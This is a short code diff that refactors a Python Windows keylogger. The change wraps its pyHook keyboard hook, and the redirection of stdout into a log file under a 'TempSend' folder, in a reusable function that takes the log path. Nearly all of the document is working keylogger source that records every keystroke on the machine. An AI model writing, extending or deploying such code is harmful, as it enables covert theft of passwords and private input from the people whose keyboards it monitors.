@@ -10,8 +10,8 @@ kernel32 = windll.kernel32
 psapi = windll.psapi
 current_window = None
 
-f=open('./TempSend/KeyLog.txt','wb')
-sys.stdout = f
+global f
+
 
 #
 def get_current_process():
@@ -71,11 +71,20 @@ def KeyStroke(event):
     # 循环监听下一个击键事件
     f.flush()
     return True
-  
-# 创建并注册hook管理器
-kl = pyHook.HookManager()
-kl.KeyDown = KeyStroke
-  
-# 注册hook并执行
-kl.HookKeyboard()
-pythoncom.PumpMessages()
+
+def KeyRecordEntry(KeyLogPath):
+    global f
+    f=open(KeyLogPath,'wb')
+    sys.stdout = f
+    
+    # 创建并注册hook管理器
+    kl = pyHook.HookManager()
+    kl.KeyDown = KeyStroke
+
+    print 'Ready to Hook!'
+    # 注册hook并执行
+    kl.HookKeyboard()
+    pythoncom.PumpMessages()
+
+#if __name__ == '__main__':
+#    KeyRecordEntry('./TempSend/KeyLog.txt')
